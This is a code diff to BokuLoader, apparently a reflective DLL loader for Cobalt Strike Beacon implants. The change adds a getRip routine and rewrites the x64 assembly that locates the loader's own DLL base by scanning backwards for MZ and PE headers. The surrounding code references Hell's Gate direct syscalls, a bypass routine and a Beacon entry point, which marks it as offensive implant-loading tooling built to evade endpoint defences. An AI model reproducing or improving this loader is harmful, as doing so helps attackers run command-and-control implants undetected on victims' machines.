@@ -11,7 +11,7 @@ void* getExportAddressTable(void* dllBase, void* dllExportDirectory);
 void* getExportNameTable(void* dllBase, void* dllExportDirectory);
 void* getExportOrdinalTable(void* dllBase, void* dllExportDirectory);
 void* getSymbolAddress(void* symbolStr, void* StrSize, void* dllBase, void* AddressTable, void* NameTable, void* OrdinalTable);
-void* getRdllBase();
+void* getRdllBase(void*);
 void* getNewExeHeader(void* dllBase);
 void* getDllSize(void* newExeHeader);
 void* getDllSizeOfHeaders(void* newExeHeader);
@@ -21,6 +21,7 @@ void* getSizeOfOptionalHeader(void* NewExeHeader);
 void* add(void* , void* );
 void* getNumberOfSections(void* newExeHeaderAddr);
 void* getBeaconEntryPoint(void* newRdllAddr, void* OptionalHeaderAddr);
+void* getRip(void);
 #ifdef SYSCALLS
 void* findSyscallNumber(void* ntdllApiAddr);
 void* HellsGate(void* wSystemCall);
@@ -86,6 +87,8 @@ void  bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA);
 
 __declspec(dllexport) void* WINAPI BokuLoader()
 {
+    // get the current address
+    PVOID BokuLoaderStart = getRip();
     // Get Export Directory and Export Tables for NTDLL.DLL
     char ws_ntdll[] = {'n',0,'t',0,'d',0,'l',0,'l',0,'.',0,'d',0,'l',0,'l',0,0};
     Dll ntdll;
@@ -144,7 +147,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 
     // Initial Source Reflective DLL
     Dll rdll_src;
-    rdll_src.dllBase              = (void*)getRdllBase();
+    rdll_src.dllBase              = (void*)getRdllBase(BokuLoaderStart); // search backwards from the start of BokuLoader
     rdll_src.NewExeHeader         = (void*)getNewExeHeader(        rdll_src.dllBase);
     rdll_src.size                 = (void*)getDllSize(             rdll_src.NewExeHeader);
     rdll_src.SizeOfHeaders        = (void*)getDllSizeOfHeaders(    rdll_src.NewExeHeader);
@@ -619,24 +622,22 @@ DWORD getSyscallNumber(void* functionAddress)
 #endif
 
 __asm__(
+"getRip: \n"
+    "mov rax, [rsp] \n"            // get the return address
+    "ret \n"
 "getRdllBase: \n"
-    "call pop \n"                  // Calling the next instruction puts RIP address on the top of our stack
-    "pop: \n"
-    "pop rcx \n"                   // pop RIP into RCX
-"dec1: \n"
-    "xor rbx, rbx \n"               // Clear out RBX - were gonna use it for comparing if we are at start
-    "mov ebx, 0x5A4D \n"            // "MZ" bytes for comparing if we are at the start of our reflective DLL
-"dec2: \n"
+    "mov rbx, 0x5A4D \n"            // "MZ" bytes for comparing if we are at the start of our reflective DLL
+"dec: \n"
     "dec rcx \n"
     "cmp bx, word ptr ds:[rcx] \n" // Compare the first 2 bytes of the page to "MZ"
-    "jne dec2 \n"
+    "jne dec \n"
     "xor rax, rax \n"
     "mov ax, [rcx+0x3C] \n"        // IMAGE_DOS_HEADER-> LONG   e_lfanew;  // File address of new exe header
     "add rax, rcx \n"              // DLL base + RVA new exe header = 0x00004550 PE00 Signature
     "xor rbx, rbx \n"
     "add bx, 0x4550 \n"             // PEOO
     "cmp bx, word ptr ds:[rax] \n" // Compare the 4 bytes to PE\0\0
-    "jne dec1 \n"
+    "jne getRdllBase \n"
     "mov rax, rcx \n"              // Return the base address of our reflective DLL
     "ret \n"                       // return initRdllAddr
 "getDllBase: \n"
